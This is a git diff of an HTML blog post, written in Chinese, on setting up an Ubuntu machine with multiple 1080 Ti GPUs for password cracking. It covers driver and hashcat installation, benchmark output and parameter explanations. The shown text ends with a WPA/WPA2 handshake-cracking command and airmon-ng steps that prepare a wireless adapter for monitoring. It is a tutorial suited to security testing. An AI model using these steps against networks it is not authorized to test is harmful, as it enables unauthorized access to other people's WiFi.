@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://www.killshadow.xyz">
   <title>Ubuntu18.04+8x1080ti爆破环境从零搭建 | Live to change world</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="硬件环境: 主机: TYAN FT77D-B7109 CPU: Intel Xeon Scalable Processor GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉) 内存: 32G 硬盘: 1T SSD">
+  <meta name="description" content="硬件环境: 主机: TYAN FT77D-B7109 CPU: Intel Xeon Scalable Processor GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉) 内存: 32G 硬盘: 1T SSD">
 <meta name="keywords" content="Wireless">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Ubuntu18.04+8x1080ti爆破环境从零搭建">
 <meta property="og:url" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/index.html">
 <meta property="og:site_name" content="Live to change world">
-<meta property="og:description" content="硬件环境: 主机: TYAN FT77D-B7109 CPU: Intel Xeon Scalable Processor GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉) 内存: 32G 硬盘: 1T SSD">
+<meta property="og:description" content="硬件环境: 主机: TYAN FT77D-B7109 CPU: Intel Xeon Scalable Processor GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉) 内存: 32G 硬盘: 1T SSD">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png">
 <meta property="og:image" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540286260611.png">
 <meta property="og:updated_time" content="2018-10-25T01:59:01.907Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Ubuntu18.04+8x1080ti爆破环境从零搭建">
-<meta name="twitter:description" content="硬件环境: 主机: TYAN FT77D-B7109 CPU: Intel Xeon Scalable Processor GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉) 内存: 32G 硬盘: 1T SSD">
+<meta name="twitter:description" content="硬件环境: 主机: TYAN FT77D-B7109 CPU: Intel Xeon Scalable Processor GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉) 内存: 32G 硬盘: 1T SSD">
 <meta name="twitter:image" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png">
   
     <link rel="alternative" href="/atom.xml" title="Live to change world" type="application/atom+xml">
@@ -35,7 +35,7 @@
     #container.show {
       background: linear-gradient(200deg,#a0cfe4,#e8c37e);
     }
-  </style>
+  </style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
 
   
@@ -44,7 +44,7 @@
 </head>
 
 <body>
-  <div id="container" q-class="show:isCtnShow">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
     <div class="left-col" q-class="show:isShow">
       
@@ -179,2019 +179,1952 @@
 <p>硬盘: 1T SSD</p>
 </blockquote>
 <a id="more"></a>
-
-<h2 id="0x00-配置环境"><a href="#0x00-配置环境" class="headerlink" title="0x00 配置环境"></a>0x00 配置环境</h2><h3 id="0x01-安装系统"><a href="#0x01-安装系统" class="headerlink" title="0x01 安装系统"></a>0x01 安装系统</h3><blockquote>
+<h2 id="x00-配置环境">0x00 配置环境</h2>
+<h3 id="x01-安装系统">0x01 安装系统</h3>
+<blockquote>
 <p>目标系统: <a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">Ubuntu 18.04.1 LTS Desktop</a> (建议安装Server版)</p>
 </blockquote>
 <p>在官网下载好启动盘之后, 用烧录工具(建议用<a href="https://sourceforge.net/projects/win32diskimager/" target="_blank" rel="noopener">win32diskimager</a>)写入U盘, 然后进入启动项选为U盘启动, 接下来开始安装, 一路默认配置就好. 具体步骤请谷歌, 这里就不赘述了. (这里我们遇到一个坑, 就是插了PCIE网卡之后安装系统一直重启, 可能是主机的兼容性问题, 装系统的时候如果条件允许, 最好把所有的外置设备卸载掉)</p>
-<h3 id="0x02-安装GPU驱动"><a href="#0x02-安装GPU驱动" class="headerlink" title="0x02 安装GPU驱动"></a>0x02 安装GPU驱动</h3><ol>
-<li><p>安装好系统之后, 可以配置一下更新源(<code>/etc/apt/sources.list</code>,我用的是中科大源), update一下系统. </p>
+<h3 id="x02-安装gpu驱动">0x02 安装GPU驱动</h3>
+<ol type="1">
+<li><p>安装好系统之后, 可以配置一下更新源(<code>/etc/apt/sources.list</code>,我用的是中科大源), update一下系统.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">sudo apt-get install gcc make p7zip-full git lsb-core</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">sudo apt-get install gcc make p7zip-full git lsb-core</span><br></pre></td></tr></table></figure></li>
 <li><p>然后将Nouveau(NVIDIA通用显卡驱动)禁用:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">"echo blacklist nouveau &gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf"</span></span><br><span class="line">sudo bash -c <span class="string">"echo options nouveau modeset=0 &gt;&gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf"</span></span><br><span class="line">sudo update-initramfs -u</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">"echo blacklist nouveau &gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf"</span></span><br><span class="line">sudo bash -c <span class="string">"echo options nouveau modeset=0 &gt;&gt; /etc/modprobe.d/blacklist-nvidia-nouveau.conf"</span></span><br><span class="line">sudo update-initramfs -u</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure></li>
 <li><p>等重启之后, 再添加32位的NVIDIA驱动源:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install build-essential libc6:i386</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install build-essential libc6:i386</span><br></pre></td></tr></table></figure></li>
 <li><p>在官网下载<a href="http://www.nvidia.com/Download/index.aspx" target="_blank" rel="noopener">驱动</a>, 下载好之后:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x NVIDIA*.run</span><br><span class="line">sudo ./NVIDIA*.run</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
-
 <p>或者:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://us.download.nvidia.com/XFree86/Linux-x86_64/375.26/NVIDIA-Linux-x86_64-375.26.run</span><br><span class="line">chmod +x NVIDIA-Linux-x86_64-375.26.run</span><br><span class="line">sudo ./NVIDIA-Linux-x86_64-375.26.run</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://us.download.nvidia.com/XFree86/Linux-x86_64/375.26/NVIDIA-Linux-x86_64-375.26.run</span><br><span class="line">chmod +x NVIDIA-Linux-x86_64-375.26.run</span><br><span class="line">sudo ./NVIDIA-Linux-x86_64-375.26.run</span><br></pre></td></tr></table></figure></li>
 <li><p>(可选步骤)安装CPU集成显卡驱动:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz</span><br><span class="line">tar -xvf opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz</span><br><span class="line"><span class="built_in">cd</span> opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz</span><br><span class="line">tar -xvf opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz</span><br><span class="line"><span class="built_in">cd</span> opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure></li>
 <li><p>这时候可以看一下显卡配置:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci | grep VGA</span><br></pre></td></tr></table></figure>
-
-</li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci | grep VGA</span><br></pre></td></tr></table></figure></li>
 </ol>
-<h3 id="0x03-安装hashcat"><a href="#0x03-安装hashcat" class="headerlink" title="0x03 安装hashcat"></a>0x03 安装hashcat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://hashcat.net/files/hashcat-3.30.7z</span><br><span class="line">7z x hashcat-3.30.7z</span><br><span class="line"><span class="built_in">cd</span> hashcat-3.30</span><br></pre></td></tr></table></figure>
-
+<h3 id="x03-安装hashcat">0x03 安装hashcat</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://hashcat.net/files/hashcat-3.30.7z</span><br><span class="line">7z x hashcat-3.30.7z</span><br><span class="line"><span class="built_in">cd</span> hashcat-3.30</span><br></pre></td></tr></table></figure>
 <p>这是个比较老的版本, 我用的aircrack跑出来的包用这个版本可以跑. 如果想尝一下鲜也可以:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://hashcat.net/files/hashcat-4.2.1.7z</span><br></pre></td></tr></table></figure>
-
 <p>顺便测试一下速度(在解压后的目录里直接运行<code>./example0.sh</code>即可):</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Bypass</span><br><span class="line">Hash.Type........: MD5</span><br><span class="line">Hash.Target......: example0.hash</span><br><span class="line">Time.Started.....: Sat Oct 20 20:08:33 2018 (27 mins, 0 secs)</span><br><span class="line">Time.Estimated...: Sat Oct 20 22:31:24 2018 (1 hour, 55 mins)</span><br><span class="line">Guess.Base.......: File (example.dict), Right Side</span><br><span class="line">Guess.Mod........: Mask (?a?a?a?a?a?a) [6], Left Side</span><br><span class="line">Guess.Queue.Base.: 1/1 (100.00%)</span><br><span class="line">Guess.Queue.Mod..: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#2.....:  8340.3 MH/s (6.61ms) @ Accel:128 Loops:64 Thr:256 Vec:1</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....:  7938.7 MH/s (6.93ms) @ Accel:128 Loops:64 Thr:256 Vec:1</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....: 16279.0 MH/s</span></span><br><span class="line">Recovered........: 3035/6494 (46.74%) Digests, 0/1 (0.00%) Salts</span><br><span class="line">Recovered/Time...: CUR:25,N/A,N/A AVG:29,1773,42558 (Min,Hour,Day)</span><br><span class="line">Progress.........: 26411945426944/139573552218112 (18.92%)</span><br><span class="line">Rejected.........: 0/26411945426944 (0.00%)</span><br><span class="line">Restore.Point....: 200933376/1073741824 (18.71%)</span><br><span class="line">Candidates.<span class="comment">#2....: sarusix102x -&gt; 6o9momx49wy3c2</span></span><br><span class="line">Candidates.<span class="comment">#3....: sarseeethelia3 -&gt; 6o9602eugeni</span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp: 79c Fan: 62% Util: 94% Core:1860MHz Mem:5005MHz Bus:16</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Temp: 84c Fan: 78% Util: 94% Core:1771MHz Mem:5005MHz Bus:16</span></span><br><span class="line"></span><br><span class="line">Started: Sat Oct 20 20:08:26 2018</span><br><span class="line">Stopped: Sat Oct 20 20:35:35 2018</span><br></pre></td></tr></table></figure>
-
 <ul>
-<li>关于上面输出的参数解析:</li>
-</ul>
-  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">实际上example0.sh的命令如下:</span><br><span class="line">./hashcat64.bin -t 32 -a 7 example0.hash ?a?a?a?a example.dict</span><br><span class="line"></span><br><span class="line">Session..........:</span><br><span class="line">Status...........: </span><br><span class="line">Hash.Type........: 表示哈希计算的类型</span><br><span class="line">Hash.Target......: 表示目标哈希表</span><br><span class="line">Time.Started.....: 计算开始时间</span><br><span class="line">Time.Estimated...: 估计结束时间</span><br><span class="line">Guess.Base.......: 密码字典</span><br><span class="line">Guess.Mod........: 密码类型(大小写/数字等)</span><br><span class="line">Guess.Queue.Base.:</span><br><span class="line">Guess.Queue.Mod..:</span><br><span class="line">Speed.Dev.<span class="comment">#2.....: 显卡1的速度(8340.0MH/s 约等于每秒83亿次运算)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....: 显卡2...</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....: 总速度</span></span><br><span class="line">Recovered........: </span><br><span class="line">Recovered/Time...: 当前已用时间(分,时,天); 平均需要时间(分,时,天)</span><br><span class="line">Progress.........: 当前进度</span><br><span class="line">Rejected.........: 应该是丢包率(猜的)</span><br><span class="line">Restore.Point....: 当前的进度</span><br><span class="line">Candidates.<span class="comment">#2....: 即将尝试爆破的密码(猜的)</span></span><br><span class="line">Candidates.<span class="comment">#3....: </span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp表示当前显卡温度;Fan表示风扇转速;Men内存频率</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Util表示内存使用率;Core表示GPU核频率;Bus通道数</span></span><br></pre></td></tr></table></figure>
-
-<ul>
+<li><p>关于上面输出的参数解析:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">实际上example0.sh的命令如下:</span><br><span class="line">./hashcat64.bin -t 32 -a 7 example0.hash ?a?a?a?a example.dict</span><br><span class="line"></span><br><span class="line">Session..........:</span><br><span class="line">Status...........: </span><br><span class="line">Hash.Type........: 表示哈希计算的类型</span><br><span class="line">Hash.Target......: 表示目标哈希表</span><br><span class="line">Time.Started.....: 计算开始时间</span><br><span class="line">Time.Estimated...: 估计结束时间</span><br><span class="line">Guess.Base.......: 密码字典</span><br><span class="line">Guess.Mod........: 密码类型(大小写/数字等)</span><br><span class="line">Guess.Queue.Base.:</span><br><span class="line">Guess.Queue.Mod..:</span><br><span class="line">Speed.Dev.<span class="comment">#2.....: 显卡1的速度(8340.0MH/s 约等于每秒83亿次运算)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....: 显卡2...</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....: 总速度</span></span><br><span class="line">Recovered........: </span><br><span class="line">Recovered/Time...: 当前已用时间(分,时,天); 平均需要时间(分,时,天)</span><br><span class="line">Progress.........: 当前进度</span><br><span class="line">Rejected.........: 应该是丢包率(猜的)</span><br><span class="line">Restore.Point....: 当前的进度</span><br><span class="line">Candidates.<span class="comment">#2....: 即将尝试爆破的密码(猜的)</span></span><br><span class="line">Candidates.<span class="comment">#3....: </span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp表示当前显卡温度;Fan表示风扇转速;Men内存频率</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Util表示内存使用率;Core表示GPU核频率;Bus通道数</span></span><br></pre></td></tr></table></figure></li>
 <li><p>关于hashcat命令参数解析(详见<a href="#附录一">附录一</a>):</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-a  指定要使用的破解模式</span><br><span class="line">-m  指定要破解的hash类型所对应的id[下面有一份完整的hash id对照表],几乎现在市面上常用的一些散列类型它都支持,而且每个版本更新都会增加一些新的算法</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force	忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show	显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment	 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,一般自己常用3</span><br><span class="line">--username 	 忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到</span><br><span class="line">--remove 	 删除已被破解成功的hash</span><br><span class="line">-r		 使用自定义破解规则,这个后期抽空再说吧,比较的复杂,不是一两句话能说完的</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-a  指定要使用的破解模式</span><br><span class="line">-m  指定要破解的hash类型所对应的id[下面有一份完整的hash id对照表],几乎现在市面上常用的一些散列类型它都支持,而且每个版本更新都会增加一些新的算法</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force	忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show	显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment	 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,一般自己常用3</span><br><span class="line">--username 	 忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到</span><br><span class="line">--remove 	 删除已被破解成功的hash</span><br><span class="line">-r		 使用自定义破解规则,这个后期抽空再说吧,比较的复杂,不是一两句话能说完的</span><br></pre></td></tr></table></figure></li>
 <li><p>真实爆破WiFi密码情况系hashcat参数解析:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure>
-
 <blockquote>
-<p>-m : hash的类型, 2500代表的是WPA/WPA2协议. 详见[② Hash种类](② Hash种类)</p>
-<p>-a: 有多种参数, 3表示穷举. 详见[⑤ 攻击模式](#⑤ 攻击模式)</p>
+<p>-m : hash的类型, 2500代表的是WPA/WPA2协议. 详见<a href="②%20Hash种类">② Hash种类</a></p>
+<p>-a: 有多种参数, 3表示穷举. 详见<a href="#⑤%20攻击模式">⑤ 攻击模式</a></p>
 <p>*.hccap: 即为<code>aircrack</code>抓到的包之后转化而来的</p>
-<p>?l: 表示所有的小写字母. 详见[⑥ 内置字符集](⑥ 内置字符集)</p>
-</blockquote>
-</li>
+<p>?l: 表示所有的小写字母. 详见<a href="⑥%20内置字符集">⑥ 内置字符集</a></p>
+</blockquote></li>
 </ul>
-<h2 id="0x10-Crack实战"><a href="#0x10-Crack实战" class="headerlink" title="0x10 Crack实战"></a>0x10 Crack实战</h2><h3 id="0x11-初始配置"><a href="#0x11-初始配置" class="headerlink" title="0x11 初始配置"></a>0x11 初始配置</h3><ol>
+<h2 id="x10-crack实战">0x10 Crack实战</h2>
+<h3 id="x11-初始配置">0x11 初始配置</h3>
+<ol type="1">
 <li><p>首先需要找一个可以监听注入的USB网卡, 如果笔记本自带网卡能用就更好了. 这里以<code>rt2800usb</code>为例讲解:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airmon-ng </span></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line">phy0	wlp3s0		iwlwifi		Intel Corporation Device 24fb (rev 10)</span><br><span class="line">phy1	wlx7cdd90f1f416	rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br></pre></td></tr></table></figure>
-
-<p>可以看到, 有两张网卡, <code>wlp3s0</code>是笔记本自带的英特尔系列网卡; <code>lx7cdd90f1f416</code>是能够监听的新插入的usb网卡.</p>
-</li>
+<p>可以看到, 有两张网卡, <code>wlp3s0</code>是笔记本自带的英特尔系列网卡; <code>lx7cdd90f1f416</code>是能够监听的新插入的usb网卡.</p></li>
 <li><p>查看网卡状态, 两张网卡的Mode都是<code>Managed</code>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># iwconfig</span></span><br><span class="line">wlx7cdd90f1f416  IEEE 802.11  ESSID:off/any  </span><br><span class="line">Mode:Managed  Access Point: Not-Associated   Tx-Power=off   </span><br><span class="line">Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">Encryption key:off</span><br><span class="line">Power Management:off</span><br><span class="line">lo        no wireless extensions.</span><br><span class="line">wlp3s0    IEEE 802.11  ESSID:off/any  </span><br><span class="line">Mode:Managed  Access Point: Not-Associated   Tx-Power=off   </span><br><span class="line">Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">Encryption key:off</span><br><span class="line">Power Management:on</span><br><span class="line">enp2s0    no wireless extensions.</span><br><span class="line">enp0s20f0u1  no wireless extensions.</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># iwconfig</span></span><br><span class="line">wlx7cdd90f1f416  IEEE 802.11  ESSID:off/any  </span><br><span class="line">Mode:Managed  Access Point: Not-Associated   Tx-Power=off   </span><br><span class="line">Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">Encryption key:off</span><br><span class="line">Power Management:off</span><br><span class="line">lo        no wireless extensions.</span><br><span class="line">wlp3s0    IEEE 802.11  ESSID:off/any  </span><br><span class="line">Mode:Managed  Access Point: Not-Associated   Tx-Power=off   </span><br><span class="line">Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">Encryption key:off</span><br><span class="line">Power Management:on</span><br><span class="line">enp2s0    no wireless extensions.</span><br><span class="line">enp0s20f0u1  no wireless extensions.</span><br></pre></td></tr></table></figure></li>
 <li><p>为了避免冲突, 先杀占用进程</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airmon-ng check kill</span></span><br><span class="line"></span><br><span class="line">Killing these processes:</span><br><span class="line"></span><br><span class="line">  PID Name</span><br><span class="line">  891 wpa_supplicant</span><br><span class="line"> 3091 dhclient</span><br><span class="line"> 4430 avahi-daemon</span><br><span class="line"> 4431 avahi-daemon</span><br></pre></td></tr></table></figure>
-</li>
